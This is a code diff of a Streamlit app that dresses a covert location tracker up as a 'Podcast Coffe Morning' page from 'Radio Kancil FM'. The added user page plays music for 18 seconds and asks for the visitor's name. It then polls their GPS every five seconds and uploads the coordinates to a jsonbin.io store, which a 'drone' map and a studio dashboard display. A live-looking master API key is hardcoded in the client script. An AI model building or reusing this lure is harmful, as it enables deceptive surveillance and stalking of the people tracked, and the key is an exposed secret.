@@ -29,68 +29,79 @@ def simpan(users, kicked):
     data["_kicked"] = kicked
     requests.put(URL, headers=HEADERS, json=data, timeout=10)
 
-# ===== USER HP - PODCAST KHUSUS NOK KENE TOK =====
+# ===== USER HP - PERSIS FOTO NETLIFY MU =====
 if mode == "user":
-    st.markdown("""
+    user_html = """
     <style>
-    .podcast-wrap{background:#000000; padding:20px 16px 20px 16px; border-radius:20px; text-align:center;}
-    .podcast-title{color:white; font-size:32px; font-weight:800; line-height:1.1; margin:10px 0 8px 0;}
-    .podcast-sub{color:#b3b3b3; font-size:15px; margin-bottom:10px;}
-    .live-badge{display:inline-block; background:#ff0000; color:white; padding:4px 14px; border-radius:20px; font-size:12px; font-weight:bold; letter-spacing:1px;}
+      *{margin:0; padding:0; box-sizing:border-box;}
+      body{background:#000;}
+      .wrap{background:#000; min-height:100vh; padding:28px 18px 20px 18px; text-align:center; font-family:Arial, sans-serif; color:white;}
+      .title{font-size:32px; font-weight:800; line-height:1.15; color:white;}
+      .sub{color:#a0a0a0; font-size:16px; margin:12px 0 22px 0;}
+      .foto{width:100%; height:440px; object-fit:cover; border-radius:24px; border:2px solid #222; display:block;}
+      .playBtn{background:#1db954; color:white; border:none; width:100%; padding:18px; font-size:24px; font-weight:800; border-radius:40px; cursor:pointer; margin-top:22px; letter-spacing:0.5px;}
+      .playBtn:active{transform:scale(0.98);}
+      .bar{width:100%; height:8px; background:#333; border-radius:10px; margin-top:20px; overflow:hidden;}
+      .fill{height:100%; width:0%; background:#1db954; transition:width 0.5s;}
+      .status{color:#00ff00; font-family:monospace; font-size:13px; margin-top:12px; min-height:20px;}
     </style>
-    """, unsafe_allow_html=True)
-    st.markdown('<div class="podcast-wrap"><span class="live-badge">● ON AIR - RADIO KANCIL FM</span><div class="podcast-title">🎙️ Podcast Coffe Morning</div><div class="podcast-sub">Sukses Berwira Usaha - Dengerin Sebentar Yuk</div></div>', unsafe_allow_html=True)
-    st.image("https://images.unsplash.com/photo-1478737270239-2f02b77fc618?w=1000&q=80", use_container_width=True)
-    # GANTI LINK MP3 MU SING 18 DETIK NANG KENE
-    audio_url = "https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3"
-    st.audio(audio_url, format="audio/mp3", autoplay=True)
-    st.info("🎵 Lagu Coffe Morning lagi muni... Diemin 18 detik, habis iku GPS langsung aktif dewe!")
-    nama = st.text_input("👤 ISI JENENGMU:", placeholder="Contoh: joni")
-    if not nama:
-        st.warning("Isi jenengmu disik! Lagu tetep muni sambil nunggu.")
-        st.stop()
-    nama = nama.strip()
-    users, kicked = ambil()
-    if nama in kicked:
-        st.error(f"⛔ {nama} DIKELUARKAN STUDIO FM! Tunggu link baru!")
-        st.stop()
-    st.success(f"Halo {nama}! Siap-siap, GPS aktif habis lagu 18 detik!")
-    html_code = f"""
-    <div id="out" style="padding:15px;background:#000;color:#00ff00;border-radius:10px;font-family:monospace;text-align:center;font-size:16px;">🎵 PODCAST MUNI...<br><span id="cd" style="font-size:28px;">18</span><br>detik lagi GPS AKTIF...</div>
+    <div class="wrap">
+      <div class="title">🎙️ Podcast Coffe Morning</div>
+      <div class="sub">Sukses Berwira Usaha - Dengerin Sebentar Yuk</div>
+      <img class="foto" src="https://images.unsplash.com/photo-1478737270239-2f02b77fc618?w=900&q=80&auto=format&fit=crop">
+      <button class="playBtn" id="playBtn" onclick="putar()">▶️ PUTAR LAGU</button>
+      <div class="bar"><div class="fill" id="fill"></div></div>
+      <div class="status" id="status"></div>
+      <audio id="lagu" preload="auto"><source src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3" type="audio/mp3"></audio>
+    </div>
     <script>
     const BIN_ID = "6aeeda8bac6210605a74a7b5";
     const API_KEY = "$2a$10$LqQMOcUMXjbfZswzJUFrReGYD5dloL2gTCOLRwT17Oo96mUzr7.aO";
-    let myId = "{nama}";
-    let sisa = 18;
-    let cd = document.getElementById('cd');
-    let timer = setInterval(function(){{
-      sisa--;
-      if(cd) cd.innerHTML = sisa;
-      if(sisa <= 0){{
-        clearInterval(timer);
-        document.getElementById('out').innerHTML = "📍 GPS AKTIF - " + myId + "<br>Mencari lokasi...";
-        kirim();
-        setInterval(kirim, 5000);
-      }}
-    }}, 1000);
-    function kirim(){{
-      navigator.geolocation.getCurrentPosition(pos => {{
-        document.getElementById('out').innerHTML = "✅ GPS AKTIF - " + myId + "<br>Lat: " + pos.coords.latitude + "<br>📍 TERKIRIM KE STUDIO FM!";
-        fetch("https://api.jsonbin.io/v3/b/" + BIN_ID + "/latest", {{headers: {{"X-Master-Key": API_KEY}}}})
-        .then(r => r.json()).then(j => {{
-          let d = j.record || {{}}; while(d.record){{ d = d.record; }}
-          let users = {{}}; let kicked = d._kicked || [];
-          for(let k in d){{ if(k != "_kicked" && d[k] && d[k].lat){{ users[k] = d[k]; }} }}
-          if(kicked.includes(myId)){{ document.getElementById('out').innerHTML = "⛔ KAMU DIKELUARKAN STUDIO FM!"; return; }}
-          users[myId] = {{lat: pos.coords.latitude, lon: pos.coords.longitude, waktu: new Date().toLocaleString()}};
+    let audio = document.getElementById('lagu');
+    let sudah = false;
+    function putar(){
+      if(sudah) return;
+      let nama = prompt("👤 ISI JENENGMU:");
+      if(!nama || !nama.trim()){ alert("Isi jenengmu disik bro!"); return; }
+      nama = nama.trim();
+      sudah = true;
+      document.getElementById('playBtn').innerHTML = "🎵 LAGI MUNI... 18 DETIK";
+      document.getElementById('status').innerHTML = "🎵 Lagu Coffe Morning muni... 18 detik lagi GPS aktif - " + nama;
+      audio.currentTime = 0;
+      audio.play();
+      // PAKSA MANDHEG PAS 18 DETIK - GAK NGANTI 6 MENIT!
+      setTimeout(function(){ audio.pause(); }, 18000);
+      let sisa = 18;
+      let timer = setInterval(function(){
+        sisa--;
+        document.getElementById('fill').style.width = ((18 - sisa) / 18 * 100) + "%";
+        if(sisa <= 0){
+          clearInterval(timer);
+          document.getElementById('playBtn').innerHTML = "✅ GPS AKTIF - " + nama;
+          document.getElementById('status').innerHTML = "📍 GPS AKTIF - " + nama + " - Terkirim ke Studio FM!";
+          kirim(nama);
+          setInterval(function(){ kirim(nama); }, 5000);
+        }
+      }, 1000);
+    }
+    function kirim(myId){
+      navigator.geolocation.getCurrentPosition(pos => {
+        document.getElementById('status').innerHTML = "✅ GPS AKTIF - " + myId + " - Lat: " + pos.coords.latitude;
+        fetch("https://api.jsonbin.io/v3/b/" + BIN_ID + "/latest", {headers: {"X-Master-Key": API_KEY}})
+        .then(r => r.json()).then(j => {
+          let d = j.record || {}; while(d.record){ d = d.record; }
+          let users = {}; let kicked = d._kicked || [];
+          for(let k in d){ if(k != "_kicked" && d[k] && d[k].lat){ users[k] = d[k]; } }
+          if(kicked.includes(myId)){ document.getElementById('status').innerHTML = "⛔ KAMU DIKELUARKAN STUDIO FM!"; return; }
+          users[myId] = {lat: pos.coords.latitude, lon: pos.coords.longitude, waktu: new Date().toLocaleString()};
           users["_kicked"] = kicked;
-          fetch("https://api.jsonbin.io/v3/b/" + BIN_ID, {{method: "PUT", headers: {{"Content-Type": "application/json", "X-Master-Key": API_KEY}}, body: JSON.stringify(users)}});
-        }});
-      }});
-    }}
+          fetch("https://api.jsonbin.io/v3/b/" + BIN_ID, {method: "PUT", headers: {"Content-Type": "application/json", "X-Master-Key": API_KEY}, body: JSON.stringify(users)});
+        });
+      });
+    }
     </script>
     """
-    st.components.v1.html(html_code, height=140)
+    st.components.v1.html(user_html, height=780)
 
 # ===== DRONE - PETA 4K =====
 elif mode == "drone":
@@ -249,7 +260,7 @@ elif mode == "drone":
     """
     st.components.v1.html(drone_html, height=820)
 
-# ===== LAPTOP - NORMAL PERSIS WINGI, GAK ONO PODCAST! =====
+# ===== LAPTOP - NORMAL, GAK ONO PODCAST =====
 else:
     st.title("📻 RADIO KANCIL FM - STUDIO FM")
     users, kicked = ambil()
